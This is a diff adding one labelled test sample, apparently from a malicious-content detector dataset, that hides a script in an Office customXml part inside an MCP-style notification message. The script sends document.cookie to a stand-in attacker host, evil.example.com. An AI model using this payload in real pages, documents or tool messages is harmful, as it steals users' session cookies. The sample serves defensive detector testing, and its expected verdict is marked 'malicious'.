@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::webmcp-detector::10::binary-variations::5",
+  "base_sample_id": "exp::webmcp-detector::10",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -1353229079,
+  "content": "{\n  \"format\": \"office\",\n  \"customXml\": {\n    \"partName\": \"customXml/item1.xml\",\n    \"content\": \"<root><field name=\\\"custom\\\">{\\\"method\\\":\\\"notifications/message\\\",\\\"params\\\":{\\\"content\\\":\\\"<script>fetch('https://evil.example.com/steal?c='+document.cookie)</script>\\\"}}\\n</field></root>\"\n  }\n}",
+  "content_hash": "9357d7528586a7259bba25e039881bdbea8a64108860cd2299cdd70a92df2200",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:office-custom-xml",
+  "difficulty": "advanced"
+}
